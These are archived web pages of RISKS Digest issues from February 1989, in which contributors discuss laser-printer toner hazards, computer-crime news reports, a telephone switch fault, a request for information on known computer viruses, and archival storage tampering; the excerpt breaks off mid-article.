people don't really worry about handling wire, pipe, or solder.  (I've seen
"wash your hands before eating" stickers on solder. I wonder if they teach that
to plumbers?)

It's standard procedure to polish the drum, by hand, with a soft cloth, when
tuning/cleaning a copier/printer. Next time I see a repairman, I'll ask. I
don't remember that they were particularly careful with the cloth.

I did hear stories about early Xerox researchers working with selenium
drums getting a strange body odor, but I don't remember any health
complications that were part of the tale.

If I were looking for troubles, I'd try to find ozone. A dirty machine or
such may make enough to be interesting. I can't remember the name, but
there are thin high voltage wires used to charge the drum.  Coronatron?

</PRE>
<HR><H3><A NAME="subj8.2">
Re: Health Hazards of Office Laser Printers
</A>
</H3>
<address>
Jeffrey Mogul
&lt;<A HREF="mailto:mogul@decwrl.dec.com ">
mogul@decwrl.dec.com 
</A>&gt;
</address>
<i>
6 Feb 1989 1252-PST (Monday)
</i><PRE>

In RISKS 8.21, Keith Dancey asks about information on the hazards of office
laser printers.  I found a little information which might be useful.  Digital
(my employer) sells the LN03 printer, the guts of which are made by Ricoh.
Included in the replacement toner cartridge kit is a "Material Safety Data
Sheet"; I suspect that this information may be available from most other
manufacturers.

The document lists, under "Hazardous Ingredients", two components of the toner:
Ferrosoferric oxide	55%
Styrene acrylic resin	45%

The document goes into some detail on toxicity and first aid, but
the short summary would be that there are only "nuisance dust" problems.

The toxicity of each ingredient is also described:

   Ferrosoferric oxide occurs in nature as the mineral "magnetite".  No
   toxicity, other than that associated with nuisance dust is recognized.

   Styrene Acrylic resin: This copolymer of styrene and acrylic acid has not
   been associated with a toxic effect in the open scientific literature,
   although the toxic effects of both styren and acrylic acid are well
   established.  For practical purposes, the polymerization process apparently
   renders this substance biologically inert, only the nuisance dust properties
   associated with inhalation of large quantities of this material would be
   expected to be of biologic concern.

Nowhere in this document is carginogencity explicitly discussed, except to
state that neither ingredient is listed in any of the following: Registry of
Toxic effects of Chemical Substances (NIOSH), Occupational Safety and Health
Administration, NIOSH, International Agency for Research on Cancer (WHO).  I
assume that this means that none of these organizations currently consider
these ingredients toxic or carcinogenic, although that's purely an inference on
my part.

Apparently, there are no "unusual fire or explosion hazards", no
"hazardous decomposition products", and no "conditions to avoid".

"Other Precautions: Do not handle in areas where wind blows.
Avoid inhalation of dust."

		o	o	o

So far, so good, I thought.  Then, I checked the Material Safety Data Sheet for
Digital's LPS40 printer, also built on a Ricoh marking engine.  This toner
includes Styrene Acrylic Resin, but it also includes "dye" (nowhere else
discussed) and Carbon Black.  That rang a bell; sure enough, there is more
question about this than the other toner.

Under "Toxic effects of ingredients":

    Carbon Black

    Carbon black(s) have been tested for toxicity and carginogenicity in both
    animal exposure experiments and in epidemiologic investigations of exposed
    worker populations.  Results of these investigations have been uniformly
    negative.  Other than for the accumulation of carbon black in the pulmonary
    system, prolong exposure to carbon blacks produced no untoward effects.
    Benzene extractions of carbon blacks from some sources have elicited
    carcinogenic responses in animals, although the parent substance, itself,
    has been negative in this regard.  The International Agency for Research on
    Cancer (IARC) has evaluated the evidence for the carcinogenicity of carbon
    black as inadequate to determine a carcinogenic risk for humans.

This document also states that "A review by the IARC of related polymers of
[the two monomers used in styrene acrylic resin] was uniformally [sic]
negative."

For more information, I turned to "Dangerous Properties of Industrial Materials
(6th ed)", by N. Irving Sax.  About carbon black it says "Whiel it is true that
the tiny particulates of carbon black contain some molecules of carcinogenic
materials, the carcinogens are apparently held tightly and are not eluted by
hot or cold water, gastric juices or blood plasma."

It is my recollection that newspaper ink contains carbon black; that
might indicate the relative level of danger of carbon black in
toner (although toner is inhalable, unlike printers' ink).

I don't normally add disclaimers to my messages, but I'm not speaking
either as a representative of Digital or as an expert on this topic.

</PRE>
<A NAME="subj9"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj9.1">
Re: Keycard badges vs. anti-shoplift systems
</A>
</H3>
<address>
Craig Leres 
&lt;<A HREF="mailto:leres@helios.ee.lbl.gov">
leres@helios.ee.lbl.gov
</A>&gt;
</address>
<i>
Tue, 07 Feb 89 00:44:49 PST
</i><PRE>

When I was in high school (about 10 years ago) they installed an inventory
control system in our library. This spiffy new hi-tech system caught the
immediate attention of a friend and me (who were sort of into lock hacking when
we were in grammar school).

Obviously, we had to find out how the system worked and that meant stealing one
of the widgets. Once accomplished, we disassembled it (it was made out of paper
and foil) and then spent a few days theorizing about how the system worked.
Luckly we had already studied electricity and magnetism in our physics class.

We were hard pressed to explain exactly how the widgets were detected by the
exit sensors, but knew it had something to do with EMF or RF. I "borrowed" a
small square of sheet metal from my metal shop class and, in a brave experiment,
we demonstrated that a steel shield could be used to neutralize the widgets.

What we never figured out was why anyone would want a system that was so easily
defeated.
                                          Craig

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/8.21.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.8.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/8.23.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B32-73</DOCNO>
<DOCOLDNO>IA012-000131-B037-447</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/8.23.html 128.240.150.127 19970217025517 text/html 24120
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 02:53:47 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 8: Issue 23</TITLE>
<LINK REL="Prev" HREF="/Risks/8.22.html">
<LINK REL="Up" HREF="/Risks/index.8.html">
<LINK REL="Next" HREF="/Risks/8.24.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/8.22.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.8.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/8.24.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 8: Issue 23</H1>
<H2> Thursday 9 February 1989  </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I><P><B>
</B><H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
  Self-Taught Space Craft 
</A>
<DD>
<A HREF="#subj1.1">
Brian Randell
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  Still a few bugs in the system, as they say 
</A>
<DD>
<A HREF="#subj2.1">
Mark Brader
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  Multi-gigabuck information "theft" 
</A>
<DD>
<A HREF="#subj3.1">
Mark Brader
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  Risks of letting key people leave employment? 
</A>
<DD>
<A HREF="#subj4.1">
David A. Curry
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  Phone Risks 
</A>
<DD>
<A HREF="#subj5.1">
Greeny
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  Virus Technical Review 
</A>
<DD>
<A HREF="#subj6.1">
David J. Ferbrache
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj7">
  Re: WORM storage and archival records 
</A>
<DD>
<A HREF="#subj7.1">
Curtis Abbott
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">

</A>
</H3>
<address>
Brian Randell 
&lt;<A HREF="mailto:Brian.Randell@newcastle.ac.uk">
Brian.Randell@newcastle.ac.uk
</A>&gt;
</address>
<i>
Thu, 9 Feb 89 13:01:01 WET DST
</i><PRE>
Subject: Self-Taught Space Craft

SCIENTISTS TO BUILD SELF-TAUGHT SPACE CRAFT

By Mary Fagan, Technology Correspondent
The Independent, 9 February 1989 (in its entirety)

 Work by British scientists will enable future space craft to control
themselves in flight without pilots, learning by trial and error in the way
humans learn to walk or ride bicycles. 

 Technology being developed at the Turing Institute in Glasgow will allow
satellites, space planes and space stations to learn to cope with the
unexpected, including equipment failure and atmospheric changes.

 Hotol, the British space plane which is involved in a long-running funding
row, is to be at the heart of a one-year project to apply a form of
artificial intelligence known as machine learning to flight control systems. 
This will allow Hotol to learn from its own experience, improving and
adjusting flight performance as flight conditions change or things go wrong. 

 Although modern control theory for spacecraft is fine as long as nothing
unpredicted happens, it cannot always cope with turbulence, if sensors fail
or parts of the craft fall off.

 Professor Donald Michie, of the Turing Institute, said: "The best analogy is
a human riding a bike - if the handlebars fall off or something goes wrong,
they can adjust their actions to regain balance. Balance is also very
important for spacecraft and for satellites in orbit."

 The work on Hotol, which will take off and land from airport runways,
concentrates on machine learning for its initial ascent into space.

 The concept, Professor Michie says, can also be applied to satellites
subjected to unforeseeable fluctuations in solar winds and changes in air
density. On large craft the huge solar panels could also be a source of
instability.

 The project is being launched by British Aerospace, which in spite of the
Government's lack of support, has kept a large team on the Hotol project. The
contract is the first signed under the Hotol Enabling Technology Club
programme, which involves a group of companies which feel that software
developed for Hotol could be valuable in other industrial areas.

    Brian Randell, Computing Laboratory, University of Newcastle upon Tyne
    JANET = B.Randell@uk.ac.newcastle  ARPA  = B.Randell@newcastle.ac.uk
    PHONE = +44 91 222 7923

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
Still a few bugs in the system, as they say
</A>
</H3>
<address>
Mark Brader 
&lt;<A HREF="mailto:msb@sq.sq.com">
msb@sq.sq.com
</A>&gt;
</address>
<i>
Wed, 8 Feb 89 18:00:06 EST
</i><PRE>

(Information from a Canadian Press wire service article carried in
 the Toronto Star, February 7.  Wording is mine except for quotes.)

The Owner-Drivers Radio Taxi Service Ltd. of London, known as
Dial-a-Cab, contracted to Mobile Data International Inc., of Richmond,
B.C., Canada, for a computerized dispatching system at a cost of $5.4 
million (Canadian).  Dial-a-Cab milked this for publicity and netted
embarrassment.  You guessed it.  As Alf, one of their drivers, put it:
"We'd made such a business saying we'd be the first in Europe to use
this computerized system and it broke down within four hours."

And it's still sitting idle.  Company chairman Ken Burns said:  "It's
not working ... A microchip has to be changed."

Another driver, Ben, said:  "There was an overload.  ... They hadn't fore-
seen the amount of traffic on it."  (That'd be 6,000 calls per day.)
"We're blowing our tops about it.  ... Everything was going to be action,
action, action.  But [it's] sitting in the cabs doing nothing."

Mobile Data's European sales director, Eric Dysthe, admitted the problems,
but noted that Dial-a-Cab was "pushing for an early startup" before their
annual general meeting.  "That ... did not allow us to do the testing we
should normally do."

Burns says Mobile Data says the problem is fixed but requires two more
months for testing.  The system has been installed in 1,450 cabs and the
company, despite the problems, has ordered an additional 320 units.

Similar systems are widely used in Canada; the one in Toronto, which is
reported to work well, is from a different supplier.

Mark Brader		"Where is down special?" ...		"Good."
Toronto			"Do you refuse to answer my question?"	"Don't know."
utzoo!sq!msb, msb@sq.com

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
multi-gigabuck information "theft"
</A>
</H3>
<address>
Mark Brader &lt;msb@sq.sq.com&gt;     
&lt;<A HREF="mailto:utzoo:msb@sq.UUCP">
utzoo:msb@sq.UUCP
</A>&gt;
</address>
<i>
Wed, 8 Feb 89 17:41:08 EST
</i><PRE>

(Information from an article by Bob Mitchell in the Toronto Star,
 February 8.  Wording is mine except for the quoted matter, which
 is from Constable Craig Lewers.)

A man has been arrested and charged with unauthorized use of
computer information, following a 2-month police investigation.
The suspect was an associate of a "very big" Toronto company:
"a company that people would know ... with offices across Canada".
Police are keeping the company's name secret at its request.
They say the perpetrator acted alone.

A password belonging to the company was used to steal information
which the company values at $4 billion (Canadian): computer files
belonging to an American company, believed [sic] to contain records
from numerous companies, and used by large Canadian companies and
the U.S. government.

"We don't know what this individual was planning to do with the
information, but the potential is unbelievable.  ...  I'm not saying
the individual intended to do this, but the program [sic] contained
the kind of information that could be sold to other companies",
said Lewers.

Mark Brader				"Every new technology carries with it
SoftQuad Inc., Toronto			 an opportunity to invent a new crime"
utzoo!sq!msb, msb@sq.com				-- Laurence A. Urgenson

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
Risks of letting key people leave employment?
</A>
</H3>
<address>
&lt;<A HREF="mailto:davy@riacs.edu">
davy@riacs.edu
</A>&gt;
</address>
<i>
Thu, 09 Feb 89 11:03:10 -0800
</i><PRE>

San Jose Mercury News, 2/8/89
TV editor charged in raid on rival's files
  TAMPA, Fla. (AP) - A TV news editor hired away from his station by a compet-
itor has been charged with unlawfully entering the computer system of his for-
mer employer to get confidential information about news stories.
  Using knowledge of the system to bypass a security shield he helped create,
Michael L. Shapiro examined and destroyed files relating to news stories at
Tampa's WTVT, according to the charges filed Tuesday.
  Telephone records seized during Shapiro's arrest in Clearwater shoed he made
several calls last month to the computer line at WTVT, where he worked as
assignment editor until joining competitor WTSP as an assistant news editor in
October.
  Shapiro, 33, was charged with 14 counts of computer-related crimes grouped
into three second-degree felony categories: offenses against intellectual
property, offenses against computer equipment and offesnes against computer
users.  He was released from jail on his own recognizance.
  If convicted, he could be sentenced to up to 15 years in prison and fined
$10,000 for each second-degree felony count.
  Bob Franklin, WTVT's interim news director, said the station's management
discovered several computer files were missing last month, and Shapiro was
called to provide help.  Franklin said the former employee claimed not to know
the cause of the problem.
  At a news conference, Franklin said: "Subsequent investigation has revealed
that, at least since early January, WTVT's newsroom computer system has been
the subject of repeated actual and attempted `break-ins.'  The computers con-
tain highly confidential information concerning the station's current and
future news stories."
  The news director said Shapiro was one of two people who had responsibility
for daily operation and maintenance of the computer system after it was in-
stalled about eight months ago.  The other still works at WTVT.
  Terry Cole, news director at WTSP, said Shapiro has been placed on leave of
absence from his job.
  Shapiro did not respond to messages asking for comment.
  Franklin said Shapiro, employed by WTVT from February 1986 to September,
1988, left to advance his career.
  "He was very good ay what he did," Franklin said.  "He left on good terms."

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
 Phone Risks
</A>
</H3>
<address>
GREENY 
&lt;<A HREF="mailto:MISS026@ECNCDC.BITNET">
MISS026@ECNCDC.BITNET
</A>&gt;
</address>
<i>
Thu 09 Feb 1989 15:23 CDT
</i><PRE>

...Just when you thought the phones were safe, here is something to make
you even more paranoid...

The other day I was on the phone with a collegue of mine discussing some things
when he realized that he had to make a quick call to someone else.  He placed
me on "Consultation Hold" [where you can put the person you're talking to on
hold, while calling another, and then go back to the first -- sorta like
Call Waiting..].  Before he put me on hold, he said "If you're on hold too long
then just hang up..."

Ten minutes later (I lost track of time typing something...), I was still on
hold, when I was suddenly brought back to reality by a beeping in the phone.  I
figured that it was simply the phone system trying to signal him that I was
still on hold and ignored it.  After five minutes of this beeping, I gave up
and hung up the phone.  Then I left my office for a while.

About an hour later, my girlfriend came to my office and said "Gee you've been
o the phone for a long time...".  I hadn't so I decided to check and see if I
might have left the phone off the hook, or if my modem had been automatically
turned on by someone calling it up.  Both turned out to be false, however, when
I picked up the phone I was presented with BOTH SIDES OF A CONVERSATION THAT
SOMEONE ELSE WAS HAVING.  Clear as a bell, as if we were in a three-way call.
So I tried to say something, but they couldn't hear me.  Wierd I thought, must
be a fluke, and hung up.  Then I picked up the phone about 5 minutes later and
they were still talking.  30 minutes later, this guy was talking to his
girlfriend.

Enough was enough I decided, so I got on another extension and called the
campus operator.  She couldn't do anything of course, and recommended I
call the Campus Features People.  They also couldn't do anything, but said
that they would leave a note for the network people in the morning.
Just wonderful, I thought.  And went home.

The next day, the phone was working, so I called the Telecommunications
office on campus, and inquired as to what happened.  The lady there said
that she'd check it out and get back to me.  About 10 minutes later she did
and informed me that it was "a software problem in the switch" and to
"call back immediately if it happens again".  Oh great, I'm thinking.  How
can I ever be sure that my conversations are at least semi-private, and
not screwed up all the time.  This campus just recently had a multi-million
dollar phone system installed (at least the first phase of it -- Audio),
and I thought that it was relatively bug free.  But recently strange things
have been happening -- such as my phone playing "operator", and an ENTIRE
dorm being cut off from phone service for about 6 hours.

...Yet another software bug....*ho hum*  Does anyone out there know of a
good, inexpensive, voice scrambler?
                                               Greeny

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
Virus Technical Review
</A>
</H3>
<address>
"David.J.Ferbrache" 
&lt;<A HREF="mailto:davidf@cs.hw.ac.uk">
davidf@cs.hw.ac.uk
</A>&gt;
</address>
<i>
9 Feb 89 10:53:21 GMT
</i><PRE>

  This request has appeared on the bitnet virus-l mailing list, and has
  been crossposted to the appropriate comp.sys groups and to comp.risks.
  I apologise for any readers who receive duplicate copies.

       -------------------------------------------------------------
       A review of the threat posed to the security and integrity of
       microcomputer systems posed by self-replicating code segments
       -------------------------------------------------------------


I am in the process of compiling information on existing computer viruses,
with a view to the production of a technical paper reviewing the threat
to system security posed by both present computer viruses and likely
future developments.

To this end I would be very grateful for information on individual
infections, preferably detailing the symptoms observed, damage caused and
disinfection techniques applied. Naturally I am also interested in details
of the operation of the viruses, although I appreciate the reticence shown
by infected parties to disseminate any details of virus operation, on the
basis that it could lead to development of further viruses.

The technical report is part of a Doctoral research thesis in computer
security, and will be available in late May. Distribution of the technical
report will be restricted to people who have a legitimate interest
(ie systems managers, commercial concerns, research), as I expect to
review the techniques exploited by viruses in a fair degree of detail at
the BIOS/DOS interface level. The report will consider the techniques used by
virus to duplicate, the ways in which viruses gain control of the computer
system, the camouflage techniques adopted and a brief overview of the
existing computer viruses. Finally the report will consider the likely
development of the threat from viruses, and how this developing threat
can be addressed by protective software in both virtual and non-virtual
machine operating environments.

At the moment I know of the following viruses:

IBM PC MS/DOS 
1. Lehigh variant 1 and 2              2. New Zealand (stoned)
3. Vienna (Austrian, 648)              4. Blackjack (1701, 1704)
5. Italian (Ping Pong)                 6. Israeli variant 1 (Friday 13th, 1813,
                                          PLO, Jerusalem), variant 2, variant 3
                                          (April 1st), variant 4
7. Brain (Pakastani) and variants      8. Yale

Also potentially variant of the Rush Hour and VirDem viruses developed 
during the CCC's work on viruses.

APPLE MAC
1. NVir variant A and B, Hpat           2. Scores
3. INIT 29                              4. ANTI
5. Peace (MacMag)

APPLE II
1. Elk 

AMIGA
1. SCA                                  2. Byte Bandit
3. IRQ

ATARI ST
1. Boot sector                          2. Virus construction set viruses

Mainframe OS worms
1. Internet worm                        2. DECNET worm
2. BITNET Xmas chain letter

I would be grateful for any information on these, or any other viruses. 
Reports of infection may be given in confidence, in which case they will
only be used as an indication of geographical distribution of infection.

A summary of known viruses, their symptoms, geographic distribution and
known disinfection measures will be posted to the list as soon as 
sufficient information is available to prepare an interim report. 

As part of the paper I will also be reviewing the effectiveness of viral
disinfection software, and would thus be interested in details of any
software you use, its effectiveness, and availability.

Thanks for your time!

For those interested here is a summary of a few of the virus reports published
on virus-l and usenet,

   Subject, author and date                     Virus      Virus-l issue

   THE AMIGA VIRUS - Bill Koester (CATS)        SCA        LOG8805
       comp.sys.amiga, 13 November 1987

   New Year's Virus Report - George Robbins     IRQ        
       1 January 1989, comp.sys.amiga

   The Elk Cloner V2.0 - Phil Goetz             ELK        
       26 Apr 1988

   THE ATARI ST VIRUS - Chris Allen             ATARI ST   
       22 March 1988, comp.sys.atari 

   Features of Blackjack Virus, Otto Stolz      BLACKJACK  v2.24
       24 Jan 1989                              

   Comments on the "(c) Brain" Virus            BRAIN      LOG8805
       Joseph Sieczkowski, Apr 1988

   Brain and the boot sequence, Dimitri Vulis   BRAIN      v2.5
        5 Jan 1989

   The Israeli viruses, Y.Radai                 ISRAELI    LOG8805
       2 May 1988

   VIRUS WARNING: Lehigh virus version II       LEHIGH v2  v2.35
       Ken van Wyk, 3 Feb 1989

   The Ping-Pong virus, Y.Radai                 ITALIAN    v2.18
       17 Jan 1989

   Known PC Viruses in the UK and their effects MOST PC    v2.23
       Alan Solomon, 1989

   Yale Virus Info, Chris Bracy,                YALE       LOG8809a
       2 Sep 1988
        
   New Macintosh Virus, Robert Hammen           ANTI
       comp.sys.mac, 7 Feb 1989

   Hpat virus-it is a slightly modified nVIR    HPAT       
       Alexis Rosen, comp.sys.mac, 7 Jan 1989

   INIT 29: a brief description,                INIT 29    v2.18
       Joel Levin, 18 Jan 1989

   A detailed description of the INIT 29 virus  INIT 29    v2.30
       Thomas Bond, 27 Jan 1989
       
   The Scores Virus, John Norstad               SCORES     LOG8804
       info-mac digest, 23 Apr 1988

   Macintosh infection at Seale-Hayne College   TSUNAMI    LOG8808d
       Adrian Vranch, 8 July 1988
   
   DEFENCE DATA NETWORK MANAGEMENT BULLETIN,    DECNET     (see also v1.59a)
       50, 23 Dec 1988, 

   The internet worm program, an analysis       INTERNET   
       Gene Spafford, Nov 1988

I apologise for any researchers whose articles I have not cited, in what is
currently an incomplete list of references. Hopefully, this article
will be of some use in providing a general list of viruses which have
affected computer systems in the past.

Thanks for your time, and I look forward to any information you can
supply me with.

Dave Ferbrache                            Personal mail to:
Dept of computer science                  Internet &lt;davidf@cs.hw.ac.uk&gt;
Heriot-Watt University                    Janet    &lt;davidf@uk.ac.hw.cs&gt;
79 Grassmarket                            UUCP     ..!mcvax!hwcs!davidf 
Edinburgh,UK. EH1 2HJ                     Tel      (UK) 31-225-6465 ext 553

</PRE>
<A NAME="subj7"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj7.1">
Re: WORM storage and archival records
</A>
</H3>
<address>
&lt;<A HREF="mailto:abbott.pa@Xerox.COM">
abbott.pa@Xerox.COM
</A>&gt;
</address>
<i>
Wed, 18 Jan 89 15:43:23 PST
</i><PRE>

I think RAMontante &lt;bobmon@iuvax.cs.indiana.edu&gt;'s remarks deserve a
response.  Steve Phillipson's proposal of WORM devices for archival storage
surely had to do with preventing electronic tampering.  Physical tampering
is quite another matter.  Floppy disks and other electronic storage media
are physical objects, and therefore subject to the same controls on
authenticity and tampering as more traditional physical objects.  Thus, a
publisher of "authentic" Shakespeare could physically mark his disks in
such a way that I can tell if the disk I get from RAMontante is authentic.
Then what remains are problems like overwriting 0's with 1's (mentioned by
PGN, I believe).  There are lots of ways around this if you even believe
it's a problem.  (You might choose not to since only changing 0's to 1's
already greatly limits the edits you can make.)  For example, a single
parity bit gives you a lot of protection (or rather, detection).  Slightly
more elaborate, and hardly more costly, schemes can give you full
protection.  

A perhaps relevant observation about the difference between paper and
electronic media is that in the former, a certain degree of authenticity
and tamperproofness is intrinsically bound up with the medium.  It doesn't
cost more, and you don't have to think about it.  Those things aren't
generally true of the newer media, so if we don't think about it, and pay
for it, we sometimes get unpleasant surprises.

- Curtis Abbott

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/8.22.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.8.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/8.24.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B32-74</DOCNO>
<DOCOLDNO>IA012-000131-B037-471</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/8.24.html 128.240.150.127 19970217025532 text/html 23384
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 02:53:58 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 8: Issue 24</TITLE>
<LINK REL="Prev" HREF="/Risks/8.23.html">
<LINK REL="Up" HREF="/Risks/index.8.html">
<LINK REL="Next" HREF="/Risks/8.25.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/8.23.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.8.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/8.25.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 8: Issue 24</H1>
<H2> Monday 13 February 1989  </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I><P><B>
</B><H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
  Massive counterfeit ATM card scheme foiled 
</A>
<DD>
<A HREF="#subj1.1">
Rodney Hoffman
</A><br>
<A HREF="#subj1.2">
 PGN
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  Computer blamed for 911 system crash 
</A>
<DD>
<A HREF="#subj2.1">
Rodney Hoffman
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  Risks of Selective Service 
</A>
<DD>
<A HREF="#subj3.1">
Rob Elkins
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  Re: Engines and probabilities 
</A>
<DD>
<A HREF="#subj4.1">
Barry Redmond
</A><br>
<A HREF="#subj4.2">
 Robert Frederking
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  Re: Structured programming 
</A>
<DD>
<A HREF="#subj5.1">
Jim Frost
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  Re: Engineering vs. Programming     
</A>
<DD>
<A HREF="#subj6.1">
John Dykstra
</A><br>
<A HREF="#subj6.2">
 Henry Spencer
</A><br>
<A HREF="#subj6.3">
 Robert English
</A><br>
<A HREF="#subj6.4">
 Shawn Stanley
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
Massive counterfeit ATM card scheme foiled
</A>
</H3>
<address>
Rodney Hoffman 
&lt;<A HREF="mailto:Hoffman.ElSegundo@Xerox.com">
Hoffman.ElSegundo@Xerox.com
</A>&gt;
</address>
<i>
12 Feb 89 14:25:22 PST (Sunday)
</i><PRE>

Summarized from a 'Los Angeles Times' (11 Feb 89) story by Douglas Frantz:

The U.S. Secret Service foiled a scheme to use more than 7,700 counterfeit
ATM cards to obtain cash from Bank of America automated tellers.  After a
